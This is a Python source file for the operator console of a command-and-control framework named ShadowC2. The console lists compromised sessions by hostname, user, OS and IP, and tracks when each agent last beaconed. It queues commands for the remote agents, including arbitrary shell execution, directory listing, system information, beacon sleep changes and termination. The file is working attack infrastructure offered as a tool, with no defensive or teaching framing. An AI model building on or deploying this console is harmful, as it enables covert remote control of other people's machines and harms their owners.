"""
ShadowC2 - Operator CLI
Interactive command-line interface for C2 operators
"""

import os
import sys
import sqlite3
import cmd
from datetime import datetime
from colorama import init, Fore, Style

# Add parent directory for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.protocol import CommandMessage

# Initialize colorama
init(autoreset=True)


class OperatorCLI(cmd.Cmd):
    """Interactive CLI for C2 operators"""
    
    intro = f"""
{Fore.RED}   _____ __              __              __________ 
  / ___// /_  ____ _____/ /___ _      __/ ____/__ \\
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / /     __/ /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /___  / __/ 
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/ /____/ 
{Fore.CYAN}        Command & Control Framework v1.0
{Fore.YELLOW}        Operator Interface
{Style.RESET_ALL}
Type 'help' or '?' to list commands.
Type 'sessions' to view active sessions.
"""
    
    prompt = f'{Fore.RED}ShadowC2{Style.RESET_ALL}> '
    
    def __init__(self, db_path="c2_server.db"):
        """
        Initialize operator CLI
        
        Args:
            db_path: Path to C2 database
        """
        super().__init__()
        self.db_path = db_path
        self.current_session = None
        
        # Check if database exists
        if not os.path.exists(db_path):
            print(f"{Fore.RED}[!] Database not found: {db_path}")
            print(f"{Fore.YELLOW}[!] Make sure the C2 server is running")
    
    def get_db_connection(self):
        """Get database connection"""
        return sqlite3.connect(self.db_path)
    
    def do_sessions(self, arg):
        """List active sessions"""
        try:
            conn = self.get_db_connection()
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM sessions ORDER BY last_seen DESC")
            sessions = cursor.fetchall()
            
            if not sessions:
                print(f"{Fore.YELLOW}[*] No active sessions")
                conn.close()
                return
            
            print(f"\n{Fore.CYAN}Active Sessions:")
            print("=" * 120)
            print(f"{'ID':<3} {'Session ID':<38} {'Hostname':<20} {'Username':<15} {'OS':<20} {'IP Address':<15} {'Last Seen':<20}")
            print("=" * 120)
            
            for idx, session in enumerate(sessions, 1):
                session_id, hostname, username, os_name, arch, ip, first_seen, last_seen, status = session
                
                # Calculate time since last seen
                time_diff = datetime.now().timestamp() - last_seen
                if time_diff < 120:
                    last_seen_str = f"{int(time_diff)}s ago"
                    color = Fore.GREEN
                elif time_diff < 600:
                    last_seen_str = f"{int(time_diff/60)}m ago"
                    color = Fore.YELLOW
                else:
                    last_seen_str = f"{int(time_diff/3600)}h ago"
                    color = Fore.RED
                
                print(f"{color}[{idx}] {session_id:<36} {hostname:<20} {username:<15} {os_name:<20} {ip:<15} {last_seen_str:<20}{Style.RESET_ALL}")
            
            print("=" * 120)
            print(f"{Fore.GREEN}Total: {len(sessions)} session(s)\n")
            
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_interact(self, arg):
        """
        Interact with a session
        Usage: interact <session_number>
        """
        if not arg:
            print(f"{Fore.YELLOW}[!] Usage: interact <session_number>")
            return
        
        try:
            session_num = int(arg)
            
            # Get session from database
            conn = self.get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT session_id, hostname FROM sessions ORDER BY last_seen DESC LIMIT ? OFFSET ?", (1, session_num - 1))
            result = cursor.fetchone()
            
            if not result:
                print(f"{Fore.RED}[!] Invalid session number")
                conn.close()
                return
            
            session_id, hostname = result
            self.current_session = session_id
            
            print(f"{Fore.GREEN}[+] Interacting with session {session_num} ({hostname})")
            print(f"{Fore.YELLOW}[*] Type 'back' to return to main menu\n")
            
            # Enter session interaction mode
            session_cli = SessionCLI(self.db_path, session_id, hostname)
            session_cli.cmdloop()
            
            self.current_session = None
            conn.close()
            
        except ValueError:
            print(f"{Fore.RED}[!] Invalid session number")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_listeners(self, arg):
        """Show active listeners"""
        print(f"{Fore.CYAN}[*] Active Listeners:")
        print(f"    [1] HTTPS Listener on 0.0.0.0:8443")
    
    def do_stats(self, arg):
        """Show C2 statistics"""
        try:
            conn = self.get_db_connection()
            cursor = conn.cursor()
            
            # Count sessions
            cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
            active_sessions = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM sessions")
            total_sessions = cursor.fetchone()[0]
            
            # Count commands
            cursor.execute("SELECT COUNT(*) FROM commands")
            total_commands = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM commands WHERE status = 'completed'")
            completed_commands = cursor.fetchone()[0]
            
            print(f"\n{Fore.CYAN}C2 Server Statistics:")
            print("=" * 50)
            print(f"{Fore.GREEN}Active Sessions:    {active_sessions}")
            print(f"Total Sessions:     {total_sessions}")
            print(f"Total Commands:     {total_commands}")
            print(f"Completed Commands: {completed_commands}")
            print("=" * 50 + "\n")
            
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_logs(self, arg):
        """Show recent logs"""
        try:
            limit = int(arg) if arg else 20
            
            conn = self.get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT timestamp, level, message FROM logs ORDER BY timestamp DESC LIMIT ?", (limit,))
            logs = cursor.fetchall()
            
            print(f"\n{Fore.CYAN}Recent Logs (last {limit}):")
            print("=" * 100)
            
            for timestamp, level, message in logs:
                dt = datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
                
                if level == "INFO":
                    color = Fore.GREEN
                elif level == "WARNING":
                    color = Fore.YELLOW
                else:
                    color = Fore.RED
                
                print(f"{color}[{dt}] [{level}] {message}{Style.RESET_ALL}")
            
            print("=" * 100 + "\n")
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def do_exit(self, arg):
        """Exit the operator interface"""
        print(f"{Fore.YELLOW}[*] Exiting...")
        return True
    
    def do_quit(self, arg):
        """Exit the operator interface"""
        return self.do_exit(arg)


class SessionCLI(cmd.Cmd):
    """CLI for interacting with specific session"""
    
    def __init__(self, db_path, session_id, hostname):
        """
        Initialize session CLI
        
        Args:
            db_path: Database path
            session_id: Session ID
            hostname: Session hostname
        """
        super().__init__()
        self.db_path = db_path
        self.session_id = session_id
        self.hostname = hostname
        self.prompt = f'{Fore.RED}(session {hostname}){Style.RESET_ALL}> '
    
    def queue_command(self, command, args=None):
        """
        Queue command for agent
        
        Args:
            command: Command type
            args: Command arguments
        """
        try:
            # Create command message
            cmd_msg = CommandMessage(
                session_id=self.session_id,
                command=command,
                args=args or []
            )
            
            # Save to database (simulating server)
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            import json
            cursor.execute('''
                INSERT INTO commands (command_id, session_id, command, timestamp, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                cmd_msg.msg_id,
                self.session_id,
                json.dumps(cmd_msg.to_dict()),
                int(datetime.now().timestamp()),
                "queued"
            ))
            
            conn.commit()
            conn.close()
            
            print(f"{Fore.GREEN}[+] Command queued: {command}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error queuing command: {e}")
    
    def do_shell(self, arg):
        """
        Execute shell command
        Usage: shell <command>
        """
        if not arg:
            print(f"{Fore.YELLOW}[!] Usage: shell <command>")
            return
        
        self.queue_command("shell", [arg])
    
    def do_whoami(self, arg):
        """Get current username"""
        self.queue_command("whoami")
    
    def do_hostname(self, arg):
        """Get hostname"""
        self.queue_command("hostname")
    
    def do_pwd(self, arg):
        """Print working directory"""
        self.queue_command("pwd")
    
    def do_cd(self, arg):
        """
        Change directory
        Usage: cd <path>
        """
        if not arg:
            print(f"{Fore.YELLOW}[!] Usage: cd <path>")
            return
        
        self.queue_command("cd", [arg])
    
    def do_ls(self, arg):
        """
        List directory
        Usage: ls [path]
        """
        path = arg if arg else "."
        self.queue_command("ls", [path])
    
    def do_sysinfo(self, arg):
        """Get system information"""
        self.queue_command("sysinfo")
    
    def do_sleep(self, arg):
        """
        Set beacon interval
        Usage: sleep <seconds>
        """
        if not arg:
            print(f"{Fore.YELLOW}[!] Usage: sleep <seconds>")
            return
        
        self.queue_command("sleep", [arg])
    
    def do_exit(self, arg):
        """Terminate agent"""
        confirm = input(f"{Fore.YELLOW}[!] Are you sure you want to terminate this agent? (yes/no): ")
        if confirm.lower() == 'yes':
            self.queue_command("exit")
            print(f"{Fore.RED}[!] Agent termination queued")
            return True
    
    def do_back(self, arg):
        """Return to main menu"""
        return True


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='ShadowC2 Operator CLI')
    parser.add_argument('--db', default='c2_server.db', help='Path to C2 database')
    
    args = parser.parse_args()
    
    # Start CLI
    cli = OperatorCLI(db_path=args.db)
    try:
        cli.cmdloop()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Exiting...")


if __name__ == "__main__":
    main()
